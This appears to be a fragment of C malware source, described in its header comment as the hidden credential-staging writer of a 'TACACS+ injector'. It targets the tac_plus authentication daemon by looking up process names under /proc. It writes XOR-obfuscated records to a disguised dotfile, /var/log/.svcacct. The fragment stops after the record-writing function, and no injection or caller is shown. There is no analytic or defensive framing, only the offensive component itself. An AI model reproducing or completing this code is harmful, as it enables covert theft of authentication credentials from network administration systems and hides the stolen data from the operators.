// Minimal hidden encoded log writer (cleartext form of the TACACS+ injector
// credential staging): targets an authentication daemon and appends
// XOR-obfuscated records to a dotfile in /var/log.
#include <stdio.h>

static const char *target_service = "tac_plus";

static void find_target(int pid, char *path, size_t cap) {
    snprintf(path, cap, "/proc/%d/comm", pid);
}

static void save_record(const unsigned char *rec, size_t n) {
    FILE *fp = fopen("/var/log/.svcacct", "ab");
    if (!fp) return;
    for (size_t i = 0; i < n; ++i) {
        unsigned char e = rec[i] ^ 0xef;
        fwrite(&e, 1, 1, fp);
    }
    fclose(fp);
}
